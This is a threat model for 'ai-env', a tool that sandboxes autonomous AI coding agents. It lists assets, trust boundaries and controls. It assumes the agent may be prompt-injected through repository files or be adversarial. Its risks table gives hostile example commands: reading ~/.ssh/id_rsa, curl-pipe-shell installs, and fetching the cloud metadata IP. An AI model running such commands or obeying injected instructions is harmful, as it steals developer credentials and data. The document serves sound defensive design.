# Threat model

This document is the v0.1 threat model for `ai-env`. It enumerates the actors,
assets, attack surfaces, and trust boundaries the tool was designed around. It
is paired with [`enforcement-boundaries.md`](enforcement-boundaries.md) (which
control actually enforces which boundary, and how) and
[`residual-risk.md`](residual-risk.md) (which classes of attack the tool does
not close).

If you are deciding whether `ai-env` is appropriate for a given workflow,
start here.

## What problem the tool exists to mitigate

`ai-env` exists because autonomous AI coding agents (Claude Code, Codex,
similar) need a host shell, network access, and read/write access to a working
copy in order to do useful work. Granting those capabilities directly to an
agent process running on a developer workstation exposes:

- The developer's SSH keys, cloud credentials, browser profiles, and Docker
  socket.
- The active working tree of the developer's repository, including history
  and other branches.
- The host network (including private RFC1918 ranges, internal services on
  loopback, and the cloud metadata IP `169.254.169.254`).
- The developer's identity on GitHub, the package registry, and any other
  authenticated network endpoint already configured in shell profile or
  keychain.

`ai-env` is designed so an agent can still run code, install dependencies,
and reach a curated set of network destinations, while the items above remain
inaccessible by default and every path out of the sandbox is explicit, logged,
and revocable.

## Actors

Each actor below is treated as separately untrusted; controls assume any one
of them may be compromised without the others noticing.

### Developer (operator)

Trusted to:

- Decide which environment to create and what task to give the agent.
- Read the agent's diff, scan results, and run report before exporting.
- Choose whether to enable unsafe modes (`--accept-reduced-isolation`,
  `--unsafe-host-network`, raw provider tokens).

Not trusted to:

- Always notice subtle changes in a large diff. The export gate
  (`internal/export/gate.go`) and protected-path matcher
  (`internal/workspace/protected.go`) are sized for this case.

### AI coding agent process

Treated as untrusted. The agent may be buggy, prompt-injected by repository
contents, or actively adversarial. Specifically the threat model assumes the
agent will:

- Try to read files outside the workspace (SSH keys, `.env`, cloud config).
- Try to invoke arbitrary network destinations including private IPs and the
  cloud metadata IP.
- Try to mutate the host repository's main branch or push directly with
  developer credentials.
- Try to execute shell commands that fetch and run remote code
  (`curl ... | sh`).
- Try to exfiltrate the workspace contents through any allowed egress
  destination.

The threat model deliberately does not depend on the agent's cooperation. A
system prompt that says "do not read SSH keys" is not a security control.

### Repository content (`README`, source files, comments)

Treated as untrusted input. A repository the agent operates on may contain
prompt-injection payloads in `README.md`, code comments, test fixtures,
dependency metadata, or generated files. The agent may execute the injected
instructions; the threat model assumes this happens and treats agent decisions
as untrusted regardless of their stated reasoning.

### Dependencies pulled during setup

Treated as untrusted. `npm install`, `pip install`, `go mod download`, and
similar fetches pull arbitrary code from public registries. The threat model
assumes any individual package may be malicious (typosquatting, account
takeover, postinstall scripts that exfiltrate data).

### Model provider (Anthropic / OpenAI API)

Treated as a trusted infrastructure dependency, not as a security boundary.
The model itself may produce harmful outputs (that is the whole point of the
sandbox), and the provider's API surface is one of the few network
destinations explicitly allowed by default. A compromised provider account
(stolen API key) is a credential-theft scenario, not a sandbox-escape
scenario.

### GitHub / package registries

Treated as semi-trusted: requests are allowed to a known set of hostnames,
but the responses are not trusted (see "Dependencies pulled during setup"
above). The brokered PR path (`internal/githubbroker/`) treats the GitHub API
itself as honest but the agent's PR contents as adversarial, which is why
the broker scans PR title, body, and commit messages with the secret scanner
before opening the PR.

## Assets and default protection

| Asset                                    | Default protection                                                                                                |
|------------------------------------------|-------------------------------------------------------------------------------------------------------------------|
| Host filesystem outside the workspace    | Not mounted into the sandbox; agent has no path to read it.                                                       |
| Active working tree                      | Agent operates on a separate `git worktree` or copy under `.ai-env/workspaces/<env-name>/`.                       |
| Home directory (`$HOME`)                 | Never mounted by default.                                                                                         |
| SSH keys (`~/.ssh/`)                     | Never mounted by default; SSH agent socket also unset.                                                            |
| Cloud credentials (`~/.aws`, `~/.gcp`)   | Never mounted by default.                                                                                         |
| Browser profiles                         | Never mounted by default.                                                                                         |
| Host Docker socket (`/var/run/docker.sock`) | Never mounted; the primary backend runs sandboxes through `sbx`, not the host daemon.                          |
| GitHub credentials                       | Held host-side by `internal/githubbroker/token.go` (`TokenHolder`); raw token never crosses into the sandbox.     |
| Model API keys (Anthropic, OpenAI)       | Injected by the host-side `internal/secrets` provider proxy; the sandbox sees `*_BASE_URL=http://127.0.0.1:<port>`. |
| Production databases                     | Blocked by default (no allowed egress path).                                                                      |
| Internal / private networks              | Blocked at the network policy layer (`internal/network/network.go`, `BlockPrivateRanges`).                        |
| Cloud metadata IP `169.254.169.254`      | Blocked at the network policy layer (`MetadataServiceCIDRs`); also in the shell shim's `HighRiskShellPatterns`.   |
| Loopback / `host.docker.internal`        | Blocked at the network policy layer (`BlockLocalhost`, `BlockHostDockerInternal`).                                |
| Main / protected Git branches            | Brokered push enforces branch prefix (`ai-env/*`); protected-branch list in broker rejects pushes to main/master. |
| `.github/workflows/**`                   | Listed in `workspace.DefaultProtectedPaths`; under `ModePR` the export gate blocks brokered PRs containing changes. |
| `.ai-env/` directory                     | Listed in `workspace.DefaultProtectedPaths`; export gate hard-blocks any patch / PR that mutates it.              |

## Attack surfaces

The trust boundary diagram below sketches where each control lives.

```
+-------------------------------------------------------------+
|  Host (developer workstation)                               |
|                                                             |
|   ai-env CLI ----+                                          |
|   PolicyEngine   |        per-run JSONL trail               |
|   GitHubBroker   +---->   policy-decisions.jsonl            |
|   ProviderProxy  |        network-events.jsonl              |
|   Supervisor     |        shell-commands.jsonl              |
|                  |                                          |
|                  v                                          |
|   +----- Backend (docker_sbx / docker / podman) --------+   |
|   |                                                     |   |
|   |   +-------- Sandbox container ----------------+     |   |
|   |   |  Workspace (git worktree or copy)         |     |   |
|   |   |  Agent process (claude / codex)           |     |   |
|   |   |  No host secrets, no Docker socket,       |     |   |
|   |   |  no SSH agent socket                      |     |   |
|   |   +-------------------------------------------+     |   |
|   |                                                     |   |
|   |   Network egress: deny by default; allowlist        |   |
|   |   honored only if adapter installs it (fail-closed) |   |
|   +-----------------------------------------------------+   |
+-------------------------------------------------------------+
```

The trust boundaries the agent's actions cross, in the order a real run hits
them:

1. **Workspace boundary** (`internal/workspace/manager.go`). The agent's
   filesystem view is a git worktree or filtered copy under
   `.ai-env/workspaces/<env-name>/`. The active working tree, the rest of
   `$HOME`, and host secrets are not on the path.
2. **Backend / kernel boundary** (`internal/backend/`). The primary
   `docker_sbx` adapter delegates to a microVM runtime; the rootless
   `docker` and `podman` fallbacks share the host kernel (see
   `residual-risk.md`).
3. **Network policy boundary** (`internal/network/network.go` plus per-backend
   adapter). Egress is `deny` by default in autonomous mode; the operator's
   `allow_domains` list widens it. Private ranges, the cloud metadata IP,
   localhost, and `host.docker.internal` are forced-block flags that cannot
   be disabled from `policy.yaml`. The supervisor refuses to start a run if
   `NetworkPolicyAdapter.Apply` fails (lifecycle state
   `StateFailedPolicy`).
4. **Provider credential boundary** (`internal/secrets/proxy.go`). Model API
   keys live on the host in `TokenHolder`-style state. The agent talks to a
   loopback proxy that injects the Authorization header server-side and
   redacts tokens from its own logs.
5. **GitHub broker boundary** (`internal/githubbroker/`). Push and PR-create
   happen on the host. The agent never receives a GitHub token. The broker
   enforces branch prefix, protected branch, path gate (workflow files,
   `.ai-env/**`), and scans PR metadata before opening the PR.
6. **Export gate boundary** (`internal/export/gate.go`). `ai-env patch` and
   `ai-env pr` consult the gate; hard blockers (high-confidence secret
   findings, `.ai-env/` changes, policy changes, quarantine) refuse export
   regardless of operator intent; configurable blockers warn or block per
   `policy.yaml`.

Each boundary fails closed in isolation: a misconfigured network adapter
aborts the run before the agent starts, a quarantined run cannot export, a
high-confidence secret finding blocks export even if the operator missed it
in the diff.

## Main risks and default mitigations

| Risk                          | Example                                                       | Default mitigation                                                                                            |
|-------------------------------|---------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------|
| Prompt injection              | `README.md` tells the agent to `cat ~/.ssh/id_rsa`            | SSH keys not mounted; loopback / private nets blocked; secret scanner gates export.                          |
| Dependency compromise         | Malicious `npm` postinstall script                            | Sandbox isolates the install; egress allowlist limits exfil destinations; no GitHub / cloud creds in sandbox. |
| Curl-pipe-shell               | `curl https://x/install.sh | sh`                              | Shell shim (`internal/policy/shim.go`, opt-in) hard-denies via `HighRiskShellPatterns`; network allowlist limits hosts that resolve. |
| Secret leakage in patch       | Agent commits `.env` or an API key                            | Built-in pattern scanner + entropy analyzer; high-confidence findings hard-block export.                     |
| Unauthorized push to main     | Agent runs `git push origin main`                             | No host Git credentials in sandbox; broker enforces branch prefix and protected-branch list.                 |
| Workflow injection            | Agent edits `.github/workflows/ci.yml`                        | Listed in `workspace.DefaultProtectedPaths`; export gate `ModePR` hard-blocks brokered PRs that touch it.    |
| Cloud metadata exfil          | Agent fetches `http://169.254.169.254/...`                    | Network policy `BlockMetadataServices` (forced on); shell shim `HighRiskShellPatterns` includes the literal IP. |
| Local-network pivot           | Agent scans `192.168.0.0/16` or talks to `host.docker.internal` | Network policy `BlockPrivateRanges`, `BlockLocalhost`, `BlockHostDockerInternal` (all forced on).            |
| Hung / runaway agent          | Agent loops forever or fills disk                             | Supervisor max-runtime timeout, idle timeout, OOM detection (`internal/run/supervisor.go`).                  |
| Token theft from provider proxy | Process inside sandbox reads loopback proxy logs            | Proxy logs are written on the host, not in the sandbox; tokens redacted via `RedactSecrets`.                 |
| Continue propagates a compromised run | `--continue` after a quarantined run                  | Quarantine state blocks `--continue` unless `--allow-continue-after-quarantine` is set.                      |

## What this model does not cover

The threat model deliberately excludes:

- **Adversarial sandbox-escape research against the backend kernel.** The
  primary `docker_sbx` backend uses microVM isolation; the rootless `docker`
  / `podman` fallbacks share the host kernel and are documented as
  reduced-isolation. Hardening the host kernel itself is the operator's
  responsibility.
- **Hostile users on the same workstation.** `ai-env` assumes the operator's
  user account is not actively being attacked by another local user. Other
  processes running as the same OS user can read `.ai-env/`, the loopback
  proxy port, and the developer's keychain regardless of what the CLI does.
- **Supply-chain attacks against `ai-env` itself.** A compromised
  `ai-env` binary, a compromised Go module dependency, or a compromised
  release pipeline can defeat every control in this document. The release
  workflow signs binaries and emits an SBOM; verifying signatures is the
  operator's responsibility.
- **Side-channel attacks across the sandbox boundary.** Timing, cache, and
  microarchitectural side channels are out of scope.

These exclusions are repeated in [`residual-risk.md`](residual-risk.md)
alongside the gaps the tool acknowledges but does not currently close.
